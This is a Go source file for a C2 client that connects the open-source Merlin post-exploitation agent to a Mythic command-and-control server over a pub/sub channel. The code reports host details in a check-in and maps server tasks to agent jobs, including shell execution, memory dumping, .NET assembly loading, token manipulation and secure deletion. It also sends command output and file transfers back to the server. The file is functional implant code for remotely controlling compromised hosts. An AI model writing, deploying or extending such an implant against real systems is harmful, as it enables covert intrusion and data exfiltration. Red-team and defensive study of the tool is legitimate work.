/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2023 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package main

import (
	"fmt"
	"strings"
        "encoding/base64"
        "encoding/json"
	"os"
	"net"
	"runtime"
	"time"
	"sync"
        "github.com/Ne0nd0g/merlin-message"
        "github.com/Ne0nd0g/merlin-message/jobs"
	"github.com/Ne0nd0g/merlin-agent/v2/core"
	"github.com/fatih/color"
	"github.com/google/uuid"
)

// PubSubClient adapts the generic Transport to Merlin's clients.Client interface
type PubSubClient struct {
	transport      *Transport
	agentID        string
	instanceID     string // unique per-process ID for routing (prevents same-UUID collision)
	config         map[string]interface{}
	messages       chan interface{}
	//Store all received jobs in this array until run.Run() retrieves them
	pendingJobs    []messages.Base
	mu             sync.Mutex
	running        bool
	initialCheckinDone bool
}

// NewPubSubClient creates a new pub/sub client for Merlin.
// Each instance generates a unique instanceID so that two agents sharing the same
// Mythic UUID get separate Pub/Sub subscriptions and do not collide.
func NewPubSubClient(cfg *Config, agentID string) (*PubSubClient, error) {
	// Generate a unique instance ID for this process.
	// This is the key to preventing same-UUID collision: each running agent
	// instance gets its own filtered subscription keyed on this ID.
	instanceID := uuid.New().String()

	if core.Verbose {
		color.Cyan(fmt.Sprintf("[*] Generated instance ID: %s (agent UUID: %s)", instanceID, agentID))
		color.Cyan(fmt.Sprintf("[*] Subscription will be: mythic-tasks-sub-%s", instanceID))
	}

	transport, err := NewTransport(cfg, instanceID, agentID)
	if err != nil {
		return nil, fmt.Errorf("failed to create pubsub transport: %w", err)
	}

	client := &PubSubClient{
		transport:   transport,
		agentID:     agentID,
		instanceID:  instanceID,
		config:      make(map[string]interface{}),
		messages:    make(chan interface{}, 100),
		// Initialize pendingJobs as empty slice
		pendingJobs: make([]messages.Base, 0),
		running:     false,
	}

	return client, nil
}

// Authenticate performs authentication (not used for pub/sub, but required by interface)
func (p *PubSubClient) Authenticate(msg messages.Base) error {
	if core.Verbose {
		color.Green("[+] PubSub client authenticated")
	}
	return nil
}

// Get retrieves a configuration value
func (p *PubSubClient) Get(key string) string {
        p.mu.Lock()
        defer p.mu.Unlock()

        if val, ok := p.config[key]; ok {
                if str, ok := val.(string); ok {
                        return str
                }
        }
        return ""
}

// Set sets a configuration value
func (p *PubSubClient) Set(key string, value string) error {
        p.mu.Lock()
        defer p.mu.Unlock()
        p.config[key] = value
        return nil
}

func (p *PubSubClient) Initial() error {
    // Wait for transport to be fully ready
    time.Sleep(2 * time.Second)
    if core.Verbose {
        color.Cyan("[*] Sending initial checkin via PubSub")
    }

    // Get system information dynamically
    hostname, _ := os.Hostname()
    username := os.Getenv("USER")
    if username == "" {
        username = os.Getenv("USERNAME")
    }

    // Get IP addresses
    ips := []string{}
    addrs, _ := net.InterfaceAddrs()
    for _, addr := range addrs {
        if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                ips = append(ips, ipnet.IP.String())
            }
        }
    }
    if len(ips) == 0 {
        ips = []string{"127.0.0.1"}
    }

    // Create proper Merlin CHECKIN message using the agent's persistent UUID
    agentUUID, _ := uuid.Parse(p.agentID)
    checkinMsg := messages.Base{
	ID:   agentUUID,
//      ID:   uuid.New(),
        Type: messages.CHECKIN,
        Payload: messages.AgentInfo{
            Version:  "2.4.2",
            Build:    "nonRelease",
            Proto:    "pubsub",
            SysInfo: messages.SysInfo{
                Platform:     runtime.GOOS,
                Architecture: runtime.GOARCH,
                UserName:     username,
                HostName:     hostname,
                Pid:          os.Getpid(),
                Ips:          ips,
                Integrity:    3,
            },
        },
        Padding: "",
    }

    // Send the checkin message
    _, err := p.Send(checkinMsg)
    if err != nil {
        if core.Verbose {
            color.Red(fmt.Sprintf("[-] Failed to send initial checkin: %s", err.Error()))
        }
        return fmt.Errorf("initial checkin failed: %w", err)
    }

    if core.Verbose {
        color.Green("[+] Initial checkin sent successfully")
    }

    return nil
}

// min helper function
func min(a, b int) int {
      if a < b {
              return a
      }
      return b
}

// handleCheckinResponse checks if a message from Mythic is a checkin response.
// If so, it extracts the new callback UUID from the "id" field and updates p.agentID.
// Returns true if the message was a checkin response (caller should skip task processing).
func (p *PubSubClient) handleCheckinResponse(mythicMsg map[string]interface{}) bool {
	// Extract and decode the "message" field using the same logic as convertMythicTasksToMerlin
	encodedMsg, ok := mythicMsg["message"].(string)
	if !ok {
		return false
	}

	// Base64 decode
	decodedBytes, err := base64.StdEncoding.DecodeString(encodedMsg)
	if err != nil {
		return false
	}

	// Must be at least 36 chars (UUID prefix) + some JSON
	if len(decodedBytes) < 37 {
		return false
	}

	// Skip the UUID prefix (first 36 characters)
	jsonBytes := decodedBytes[36:]

	// Handle possible double-encoding (same as convertMythicTasksToMerlin)
	if len(jsonBytes) > 0 {
		secondDecode, err := base64.StdEncoding.DecodeString(string(jsonBytes))
		if err == nil && len(secondDecode) > 0 {
			jsonBytes = secondDecode

			// Strip any prefix before the JSON object
			jsonStart := -1
			for i := 0; i < len(jsonBytes) && i < 40; i++ {
				if jsonBytes[i] == '{' {
					jsonStart = i
					break
				}
			}
			if jsonStart > 0 {
				jsonBytes = jsonBytes[jsonStart:]
			}
		}
	}

	// Parse JSON
	var data map[string]interface{}
	if err := json.Unmarshal(jsonBytes, &data); err != nil {
		return false
	}

	// Check if this is a checkin response: action == "checkin" and status == "success"
	action, _ := data["action"].(string)
	status, _ := data["status"].(string)
	newID, hasID := data["id"].(string)

	if action != "checkin" || status != "success" || !hasID || newID == "" {
		return false
	}

	// Validate that the new ID is a valid UUID
	if _, err := uuid.Parse(newID); err != nil {
		if core.Verbose {
			color.Red(fmt.Sprintf("[-] Checkin response contained invalid UUID: %s", newID))
		}
		return false
	}

	// Update the agent ID
	oldID := p.agentID
	p.agentID = newID

	if core.Verbose {
		color.Green(fmt.Sprintf("[+] UUID updated from %s to %s (checkin response)", oldID, newID))
	}

	return true
}

// convertMythicTasksToMerlin converts Mythic task format to Merlin messages.Base
func (p *PubSubClient) convertMythicTasksToMerlin(mythicMsg map[string]interface{}) messages.Base {
      // Use the original payload UUID (from transport) for base.ID so that
      // Merlin's core run.Run() accepts the message. p.agentID may have been
      // updated to the callback UUID, but the agent's internal ID is still
      // the payload UUID.
      base := messages.Base{
              ID:   uuid.MustParse(p.transport.agentID),
              Type: messages.JOBS,
      }

      // Decode the base64 "message" field if present
      var taskData map[string]interface{}
      if encodedMsg, ok := mythicMsg["message"].(string); ok {
              // Decode base64 (first time)
              decodedBytes, err := base64.StdEncoding.DecodeString(encodedMsg)
              if err != nil {
                      if core.Verbose {
                              color.Red(fmt.Sprintf("[-] Failed to decode base64 message: %v", err))
                      }
                      base.Payload = []jobs.Job{}
                      return base
              }

              // The decoded message has format: UUID (36 chars) + JSON (or base64-encoded JSON)
              // UUID is always 36 characters (8-4-4-4-12 with dashes)
              if len(decodedBytes) < 37 {
                      if core.Verbose {
                              color.Red("[-] Decoded message too short")
                      }
                      base.Payload = []jobs.Job{}
                      return base
              }

              // Skip the UUID (first 36 characters)
              jsonBytes := decodedBytes[36:]

              if core.Debug {
                      color.Yellow(fmt.Sprintf("[DEBUG] After UUID strip, jsonBytes length: %d", len(jsonBytes)))
                      color.Yellow(fmt.Sprintf("[DEBUG] First 100 chars of jsonBytes: %s", string(jsonBytes[:min(100, len(jsonBytes))])))
              }

              // Check if the JSON portion is still base64 encoded (double encoding)
              // Try to decode it - if it works, use the decoded version
              if len(jsonBytes) > 0 {
                      secondDecode, err := base64.StdEncoding.DecodeString(string(jsonBytes))
                      if err == nil && len(secondDecode) > 0 {
                              // Successfully decoded again - the message was double-encoded after UUID
                              jsonBytes = secondDecode
                              if core.Debug {
                                      color.Yellow(fmt.Sprintf("[DEBUG] JSON was base64 encoded, decoded to: %s", string(jsonBytes[:min(100, len(jsonBytes))])))
                              }

                              // After second decode, there may be a UUID fragment prefix before the JSON
                              // Find where the actual JSON starts by looking for '{'
                              jsonStart := -1
                              for i := 0; i < len(jsonBytes) && i < 40; i++ {
                                      if jsonBytes[i] == '{' {
                                              jsonStart = i
                                              break
                                      }
                              }

                              if jsonStart > 0 {
                                      jsonBytes = jsonBytes[jsonStart:]
                                      if core.Debug {
                                              color.Yellow(fmt.Sprintf("[DEBUG] Stripped %d-char prefix, JSON now: %s", jsonStart, string(jsonBytes[:min(100, len(jsonBytes))])))
                                      }
                              }
                      }
              }

              // Parse JSON
              if err := json.Unmarshal(jsonBytes, &taskData); err != nil {
                      if core.Verbose {
                              color.Red(fmt.Sprintf("[-] Failed to unmarshal message: %v", err))
                              color.Red(fmt.Sprintf("[-] Decoded bytes length: %d", len(decodedBytes)))
                              color.Red(fmt.Sprintf("[-] First 50 chars: %s", string(decodedBytes[:min(50, len(decodedBytes))])))
                              color.Red(fmt.Sprintf("[-] JSON portion: %s", string(jsonBytes[:min(200, len(jsonBytes))])))
                      }
                      // Return empty payload when parsing fails
                      base.Payload = []jobs.Job{}
                      return base
              }
      } else {
              // No encoded message, use mythicMsg directly
              taskData = mythicMsg
      }

      // Extract tasks array from decoded data
      tasksInterface, ok := taskData["tasks"]
      if !ok {
              // No tasks, return empty JOBS message
              base.Payload = []jobs.Job{}
              return base
      }

      tasksArray, ok := tasksInterface.([]interface{})
      if !ok {
              base.Payload = []jobs.Job{}
              return base
      }

      // Convert Mythic tasks to Merlin job format
      merlinJobs := make([]jobs.Job, 0, len(tasksArray))
      for _, taskInterface := range tasksArray {
              taskMap, ok := taskInterface.(map[string]interface{})
              if !ok {
                      continue
              }

              // Extract task details
              taskID, _ := taskMap["id"].(string)
              commandStr, _ := taskMap["command"].(string)

              // Parse parameters to get command and args
              // Parameters format: JSON string with "type" and "payload" fields
              // Where "payload" is ANOTHER JSON string with "command" and "args"
              var cmd jobs.Command
              if paramsInterface, ok := taskMap["parameters"]; ok {
                      if paramsStr, ok := paramsInterface.(string); ok {
                              // Parse first level: {"type":4,"payload":"{...}"}
                              var paramsMap map[string]interface{}
                              if err := json.Unmarshal([]byte(paramsStr), &paramsMap); err == nil {
                                      // Extract the nested payload
                                      if payloadInterface, ok := paramsMap["payload"]; ok {
                                              if payloadStr, ok := payloadInterface.(string); ok {
                                                      // Parse second level: {"command":"ls","args":["-a"]}
                                                      json.Unmarshal([]byte(payloadStr), &cmd)
                                              } else if payloadMap, ok := payloadInterface.(map[string]interface{}); ok {
                                                      // Direct map
                                                      if c, ok := payloadMap["command"].(string); ok {
                                                              cmd.Command = c
                                                      }
                                                      if a, ok := payloadMap["args"].([]interface{}); ok {
                                                              for _, arg := range a {
                                                                      if argStr, ok := arg.(string); ok {
                                                                              cmd.Args = append(cmd.Args, argStr)
                                                                      }
                                                              }
                                                      }
                                              }
                                      }
                              }
                      }
              }

              // If command wasn't in parameters, use the task command
              if cmd.Command == "" {
                      cmd.Command = commandStr
              }

              // Determine the correct job type based on command
              var jobType jobs.Type
              switch strings.ToLower(cmd.Command) {
              // CONTROL type commands
              case "exit", "agentinfo", "ja3", "killdate", "maxretry", "padding", "parrot", "skew", "sleep", "initialize", "connect", "listener":
                      jobType = jobs.CONTROL
              // CMD type commands (shell execution)
              case "shell", "run", "exec":
                      jobType = jobs.CMD
              // MODULE type commands
              case "ps", "pipes", "uptime", "netstat", "ssh", "token", "runas", "memory", "memfd", "link", "unlink":
                      jobType = jobs.MODULE
              case "createprocess", "minidump", "invoke-assembly", "load-assembly", "list-assemblies":
                      jobType = jobs.MODULE
              // NATIVE type commands (built-in OS commands)
              case "ls", "cd", "pwd", "rm", "env", "ifconfig", "killprocess", "nslookup", "touch", "sdelete":
                      jobType = jobs.NATIVE
              // Default to NATIVE for unknown commands
              default:
                      jobType = jobs.NATIVE
              }

              // Create proper Merlin job
              // Use original payload UUID so Merlin's core accepts the job
              job := jobs.Job{
                      AgentID: uuid.MustParse(p.transport.agentID),
                      ID:      taskID,
                      Token:   uuid.New(),
                      Type:    jobType,
                      Payload: cmd,
              }

              merlinJobs = append(merlinJobs, job)

              if core.Debug {
                      color.Yellow(fmt.Sprintf("[DEBUG] Created job: ID=%s, Command=%s, Args=%v", job.ID, cmd.Command, cmd.Args))
              }
      }

      if core.Debug {
              color.Yellow(fmt.Sprintf("[DEBUG] Total jobs created: %d", len(merlinJobs)))
      }

      // Assign []jobs.Job directly - interface{} can hold any type
      // Don't convert to []interface{} as that breaks type assertions in run.Run()
      base.Payload = merlinJobs
      return base
}


// Listen starts listening for messages from the server
func (p *PubSubClient) Listen() ([]messages.Base, error) {
      p.mu.Lock()
      if !p.running {
              // First time - start the listener goroutine
              p.running = true
              p.mu.Unlock()

              if core.Verbose {
                      color.Cyan("[*] Starting PubSub listener goroutine")
              }

              // Start listening in background for PubSub messages
              go func() {
                      err := p.transport.Listen(func(task map[string]interface{}) map[string]interface{} {
                              if core.Debug {
                                      color.Yellow(fmt.Sprintf("[DEBUG] Received task: %v", task))
                              }

                              // Queue the message for processing
                              p.messages <- task

                              // Return nil - we'll send responses separately via Send()
                              return nil
                      })

                      if err != nil {
                              if core.Verbose {
                                      color.Red(fmt.Sprintf("[-] Listen error: %v", err))
                              }
                      }
              }()

              // Background processor goroutine - converts Mythic tasks to Merlin format
              go func() {
                      for msg := range p.messages {
                              // Convert Mythic format to Merlin format
                              mythicMap, ok := msg.(map[string]interface{})
                              if !ok {
                                      if core.Verbose {
                                              color.Red(fmt.Sprintf("[-] Invalid message type: %T", msg))
                                      }
                                      continue
                              }

                              // Check if this is a checkin response with a new callback UUID
                              if p.handleCheckinResponse(mythicMap) {
                                      continue // UUID updated, skip task processing
                              }

                              // Convert to messages.Base using our conversion function
                              base := p.convertMythicTasksToMerlin(mythicMap)

                              if core.Verbose {
                                      color.Green(fmt.Sprintf("[+] Received task from PubSub: %v", base))
                              }

                              // Add to pending jobs queue - run.Run()'s listen() goroutine will call Listen() to retrieve these
                              p.mu.Lock()
                              p.pendingJobs = append(p.pendingJobs, base)
                              p.mu.Unlock()

                              if core.Debug {
                                      color.Yellow(fmt.Sprintf("[DEBUG] Added message to pending queue, total: %d", len(p.pendingJobs)))
                              }
                      }
              }()

              return []messages.Base{}, nil
      }
      p.mu.Unlock()

      // Retrieve pending jobs
      p.mu.Lock()
      jobs := make([]messages.Base, len(p.pendingJobs))
      copy(jobs, p.pendingJobs)
      p.pendingJobs = p.pendingJobs[:0] // Clear the queue
      p.mu.Unlock()

      if core.Debug && len(jobs) > 0 {
              color.Yellow(fmt.Sprintf("[DEBUG] Returning %d jobs from pending queue", len(jobs)))
              for i, job := range jobs {
                      color.Yellow(fmt.Sprintf("[DEBUG] Job %d: Type=%v, Payload=%v", i, job.Type, job.Payload))
              }
      }

      // If no jobs, sleep briefly to avoid tight loop
      if len(jobs) == 0 {
              time.Sleep(100 * time.Millisecond)
      }

      return jobs, nil
}


func (p *PubSubClient) Send(message messages.Base) ([]messages.Base, error) {
    if core.Debug {
        color.Yellow(fmt.Sprintf("[DEBUG] Sending message: %v", message))
    }

    // Convert Merlin format to Mythic API format
    mythicMsg := p.convertToMythicFormat(message)

    // Send via transport
    err := p.transport.Send(mythicMsg)
    if err != nil {
        return nil, fmt.Errorf("failed to send: %w", err)
    }

    if core.Verbose {
        color.Green("[+] Message sent successfully")
    }

   return []messages.Base{}, nil
}

// convertToMythicFormat converts Merlin messages.Base to Mythic API format
func (p *PubSubClient) convertToMythicFormat(msg messages.Base) map[string]interface{} {
    mythicMsg := make(map[string]interface{})

    // Convert message type to Mythic action
    switch msg.Type {
    case messages.CHECKIN:
        // Only send "checkin" action for the very first checkin
        // After that, convert to "get_tasking" to avoid creating new callbacks
        if !p.initialCheckinDone {
            mythicMsg["action"] = "checkin"
            mythicMsg["uuid"] = p.agentID

            // Extract AgentInfo if present
            if agentInfo, ok := msg.Payload.(messages.AgentInfo); ok {
                sysInfo := agentInfo.SysInfo
                mythicMsg["ips"] = sysInfo.Ips
                mythicMsg["os"] = sysInfo.Platform
                mythicMsg["user"] = sysInfo.UserName
                mythicMsg["host"] = sysInfo.HostName
                mythicMsg["pid"] = sysInfo.Pid
                mythicMsg["architecture"] = sysInfo.Architecture
                mythicMsg["domain"] = sysInfo.Domain
                mythicMsg["integrity_level"] = sysInfo.Integrity
            }

            // Mark initial checkin as done
            p.initialCheckinDone = true
        } else {
            // Subsequent checkins become get_tasking requests
            mythicMsg["action"] = "get_tasking"
            mythicMsg["uuid"] = p.agentID
            mythicMsg["tasking_size"] = -1
        }

    case messages.JOBS:
        // Check if this is a result message (jobs being returned) or a request for jobs
        jobsArray, ok := msg.Payload.([]jobs.Job)
        if ok && len(jobsArray) > 0 {
            // Check if first job is a RESULT type
            if jobsArray[0].Type == jobs.RESULT || jobsArray[0].Type == jobs.AGENTINFO || jobsArray[0].Type == jobs.FILETRANSFER {
                // This is a result being sent back to Mythic
                mythicMsg["action"] = "post_response"
                mythicMsg["uuid"] = p.agentID

                // Build responses array
                responses := make([]interface{}, 0, len(jobsArray))
                for _, job := range jobsArray {
                    response := map[string]interface{}{
                        "task_id": job.ID,
                    }

                    // Handle different result types
                    switch job.Type {
                    case jobs.RESULT:
                        result := job.Payload.(jobs.Results)
                        if result.Stdout != "" {
                            response["user_output"] = result.Stdout
                        }
                        if result.Stderr != "" {
                            response["user_output"] = result.Stderr
                        }
                        response["completed"] = true
                        response["status"] = "success"
                    case jobs.AGENTINFO:
                        // Convert AgentInfo to JSON
                        infoBytes, _ := json.Marshal(job.Payload)
                        response["user_output"] = string(infoBytes)
                        response["completed"] = true
                        response["status"] = "success"
                    case jobs.FILETRANSFER:
                        // Handle file transfer results
                        ft := job.Payload.(jobs.FileTransfer)
                        if ft.IsDownload {
                            response["user_output"] = fmt.Sprintf("File uploaded: %s", ft.FileLocation)
                        } else {
                            response["user_output"] = fmt.Sprintf("File downloaded: %s", ft.FileLocation)
                            response["download"] = map[string]interface{}{
                                "path": ft.FileLocation,
                                "data": ft.FileBlob,
                            }
                        }
                        response["completed"] = true
                        response["status"] = "success"
                    }

                    responses = append(responses, response)
                }

                mythicMsg["responses"] = responses
            } else {
                // Empty jobs message or requesting more tasks
                mythicMsg["action"] = "get_tasking"
                mythicMsg["uuid"] = p.agentID
                mythicMsg["tasking_size"] = -1
            }
        } else {
            // Empty jobs array - request more tasks
            mythicMsg["action"] = "get_tasking"
            mythicMsg["uuid"] = p.agentID
            mythicMsg["tasking_size"] = -1
        }

    default:
        // For other message types, just pass through as JSON
        mythicMsg["action"] = "post_response"
        mythicMsg["uuid"] = p.agentID
        mythicMsg["responses"] = []interface{}{msg}
    }

    return mythicMsg
}



// Synchronous returns whether this is a synchronous client
// For PubSub integration with run.Run(), we return true so that the listen() goroutine
// is started, which regularly calls Listen() to retrieve and process queued jobs
func (p *PubSubClient) Synchronous() bool {
	return true
}

// Close closes the pub/sub client
func (p *PubSubClient) Close() error {
	if core.Verbose {
		color.Cyan("[*] Closing PubSub client")
	}

	p.mu.Lock()
	p.running = false
	p.mu.Unlock()

	close(p.messages)
	return p.transport.Close()
}
